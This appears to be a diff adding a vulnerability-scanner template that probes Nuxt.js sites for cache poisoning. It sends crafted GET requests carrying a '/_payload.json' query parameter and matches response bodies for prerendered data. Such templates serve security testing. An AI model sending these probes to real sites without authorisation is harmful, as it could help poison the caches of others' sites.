@@ -1,0 +1,29 @@
+id: nuxtjs-cache-posioning
+
+info:
+  name: Nuxtjs Cache Posioning 
+  author: omkar7505
+  severity: high
+  description: |
+    This template check if it is vulnerable to cache posioning 
+  tags: omkar7505,nuxtjs,cache
+
+  
+http:
+  - raw:
+      - |
+        GET /?poc=/_payload.json HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /doesnotexist?poc=/_payload.json HTTP/1.1
+        Host: {{Hostname}}
+
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_1, 'prerenderedAt') && contains(body_1, 'data')"
+          - "contains(body_2, 'prerenderedAt') && contains(body_2, 'data')"
+        condition: or
